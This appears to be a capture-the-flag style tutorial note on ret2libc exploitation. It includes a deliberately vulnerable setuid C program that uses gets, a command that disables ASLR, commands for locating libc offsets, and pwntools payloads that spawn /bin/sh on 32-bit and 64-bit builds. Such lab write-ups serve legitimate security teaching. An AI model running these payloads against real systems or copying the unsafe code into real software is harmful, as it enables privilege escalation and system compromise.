```c
#include <stdio.h>

int secret_function() {
    asm("jmp %esp");
}

void receive_feedback()
{
    char buffer[64];

    puts("Please leave your comments for the server admin but DON'T try to steal our flag.txt:\n");
    gets(buffer);
}

int main()
{
    setuid(0);
    setgid(0);

    receive_feedback();

    return 0;
}
```

```txt
flag{w0w_1_7h0u9h7_7h15_w45_53cu23_n0w}
```

```bash
gcc prog.c -o prog -fno-stack-protector -no-pie -m32
```

This program was compiled without the `-z execstack` flag. This means `NX` was enabled, so we can't do the same thing we did in [[Shellcode injection]], since stack data won't be executable.

We don't have any useful function to return to, we can't execute shellcode on the stack anymore. What do we do?

The program was dynamically linked, meaning it looks for system functions like `gets` or `puts` from the system through a GOT (Global Offset Table) table. Some binary has ASLR enabled, which will randomize the address, the linker will go in and fill in the GOT table with the addresses of the system functions so that the binary won't have to figure out where the system function is in the system.

That means we could potentially call the system functions that are in `libc` like `system` and start executing code there. For our case, the padding bytes for the input will be 76 padding bytes. Then we want to write the address of the `system` function along with the parameter `/bin/sh`, which will allow us to spawn a shell.

We'll first need the address of the `libc` library for our program, which we can get using this command:

```bash
ldd prog
```

One thing to note is that normally, every time we run this, the address of the `libc` is different. This is because of ASLR. For this example, the ASLR has been turned off via this command:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

We can read out the address of a function in the `libc` library using `readelf`. The below command will grep the information of the `system` function, which includes the offset of the function from the base of `libc`:

```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```

We can also grab the offset to the string `/bin/sh` from the `libc` library using the `strings` command:

```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
```

Now, we can calculate the exact address of these functions:

```python
# libc offsets, found manually (ASLR OFF)
libc_base = 0xf7dba000
system = libc_base + 0x45040
binsh = libc_base + 0x18c338
```

Now we can build our payload:

```python
payload = flat(
    asm('nop') * padding,  # Padding bytes
    system,  # Address of system function in libc
    0x0,  # Return address (cuz the function call needs it)
    binsh  # Address of /bin/sh in libc
)
```

We can do the same to the 64-bit version:

```c
#include <stdio.h>

void receive_feedback()
{
    char buffer[64];

    puts("Please leave your comments for the server admin but DON'T try to steal our flag.txt:\n");
    gets(buffer);
}

int main()
{
    setuid(0);
    setgid(0);

    receive_feedback();

    return 0;
}
```

We just need to put our `/bin/sh` into the `rdi` register with the `pop rdi` gadget.

```python
# libc offsets, found manually (ASLR OFF)
libc_base = 0x7ffff7dde000
system = libc_base + 0x48e50
binsh = libc_base + 0x18a152

# POP RDI gadget (found with ropper)
pop_rdi = 0x40120b

padding = 72

payload = flat(
    asm('nop') * padding,  # Padding bytes
    pop_rdi,  # Pop the following address into the RDI register
    binsh,  # Address of /bin/sh in libc
    system,  # Address of system function in libc
)
```